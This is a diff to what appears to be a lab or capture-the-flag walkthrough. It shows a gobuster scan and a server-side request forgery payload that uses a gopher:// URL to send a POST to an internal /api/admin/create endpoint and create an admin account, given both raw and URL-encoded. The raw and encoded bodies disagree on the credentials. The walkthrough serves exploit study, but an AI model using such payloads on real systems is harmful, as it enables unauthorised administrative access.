@@ -50,11 +50,17 @@ gobuster dir -u 192.168.164.121 -w /usr/share/wordlists/dirb/common.txt
 
 ```
 cv=gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
+Host: localhost
 Content-Type: application/x-www-form-urlencoded;charset=UTF-8
-username=amrityam&password=amrityam
+Content-Length: 35
+
+username=test&password=test
 ```
 
-URL Encoded:
+### **URL Encoded**
+
+space: %20      
+next line: %0A
 ```
 cv=gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0AHost:%20localhost%0AContent-Type:%20application/x-www-form-urlencoded;charset=UTF-8%0AContent-Length:%2035%0A%0Ausername=amrityam%26password=amrityam
 ```
